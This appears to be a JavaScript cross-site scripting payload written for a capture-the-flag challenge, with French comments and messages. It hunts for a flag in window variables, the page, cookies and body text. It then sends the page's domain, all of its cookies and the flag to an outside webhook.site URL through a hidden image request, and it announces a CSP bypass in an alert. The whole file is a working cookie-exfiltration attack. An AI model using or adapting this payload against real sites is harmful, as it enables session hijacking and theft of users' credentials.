
const timestamp = new Date();
const timeString = timestamp.toISOString();
const formattedTime = timestamp.toLocaleTimeString(); 


let flagContent = "Aucun flag trouvé";
try {

    if (window.flag || window.FLAG) {
        flagContent = window.flag || window.FLAG;
    } 

    else if (document.getElementById('flag')) {
        flagContent = document.getElementById('flag').textContent;
    }

    else if (document.cookie.match(/flag=([^;]+)/)) {
        flagContent = document.cookie.match(/flag=([^;]+)/)[1];
    }

    else {
        const bodyText = document.body.innerText;
        const flagRegex = /HLB2025{[^}]+}/i;
        const match = bodyText.match(flagRegex);
        if (match) {
            flagContent = match[0];
        }
    }
} catch (e) {
    console.error("Erreur:", e);
}

const exfilURL = `https://webhook.site/54b704ef-2f7a-4a22-a5ea-7f6efb8f8e41?time=${encodeURIComponent(timeString)}&domain=${encodeURIComponent(document.domain)}&cookies=${encodeURIComponent(document.cookie)}&flag=${encodeURIComponent(flagContent)}`;

const img = new Image();
img.src = exfilURL;
document.body.appendChild(img);


console.log(`Payload exécuté à: ${formattedTime} (${timeString})`);
console.log(`Domaine: ${document.domain}`);
console.log(`Cookie: ${document.cookie}`);
console.log(`Flag potentiel: ${flagContent}`);

alert(`CSP Contournée!\nHeure d'exécution: ${formattedTime}\nDomaine: ${document.domain}\nCookies: ${document.cookie}\nFlag: ${flagContent}`);

const hour = timestamp.getHours().toString().padStart(2, '0');
const minute = timestamp.getMinutes().toString().padStart(2, '0');
const second = timestamp.getSeconds().toString().padStart(2, '0');
console.log(`Format d'heure HH:MM:SS: ${hour}:${minute}:${second}`);
console.log(`Format d'heure HHMMSS: ${hour}${minute}${second}`);